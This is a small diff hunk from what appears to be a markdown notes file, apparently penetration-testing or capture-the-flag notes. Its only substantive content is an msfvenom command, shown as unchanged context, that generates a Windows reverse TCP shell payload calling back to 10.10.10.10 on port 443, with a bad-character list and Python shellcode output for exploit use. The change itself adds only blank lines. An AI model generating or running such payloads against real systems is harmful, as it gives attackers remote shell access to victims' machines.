@@ -16,3 +16,5 @@ updated_at: '2023-04-10T20:37:52.592457+00:00'
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -b "\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40" -f py -v shellcode -a x86 --platform windows
 ```
+
+
